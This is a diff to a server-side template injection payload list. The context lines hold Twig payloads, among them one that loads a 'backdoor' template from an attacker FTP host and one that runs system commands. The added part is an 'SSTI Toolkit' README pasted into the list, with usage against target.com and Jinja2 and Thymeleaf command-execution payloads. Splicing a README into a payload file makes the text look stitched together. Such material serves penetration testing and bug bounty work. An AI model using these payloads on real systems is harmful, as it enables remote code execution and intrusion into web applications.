@@ -66,3 +66,27 @@ PHP / Twig / Symfony / Laravel Blade
 {{_self.env.setCache("ftp://attacker:80")}}{{_self.env.loadTemplate("backdoor")}}
 {{['id']|filter('system')}}
 {{app.request.server.all|join(',')}}
+# SSTI Toolkit – Server-Side Template Injection Detector & Exploiter (2025 Edition)
+
+## Overview
+This repo contains simple Python tools for detecting and exploiting SSTI vulnerabilities in web apps. Built for red teamers and bug bounty hunters. Tested on Flask/Jinja2, Spring/Thymeleaf, and Node/Pug.
+
+## Features
+- Blind & reflected SSTI detection with polyglot payloads
+- Automatic RCE exploitation (reverse shell support)
+- 2025 updated bypasses for WAF (Cloudflare, AWS)
+
+## Usage
+1. Install: `pip install requests`
+2. Detect: `python ssti_detector.py -u http://target.com/search?q=`
+3. Exploit: `python ssti_exploit.py -u http://target.com -p "{{7*7}}"`
+
+## Payloads
+- Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['sys'].modules['os'].popen('id').read()}}`
+- Thymeleaf: `${T(java.lang.Runtime).getRuntime().exec("id")}`
+
+## Disclaimer
+For educational/lab use only. Do not use on production systems without permission.
+
+Author: hikmeteli (@hikmeteli)
+Last updated: Dec 2025
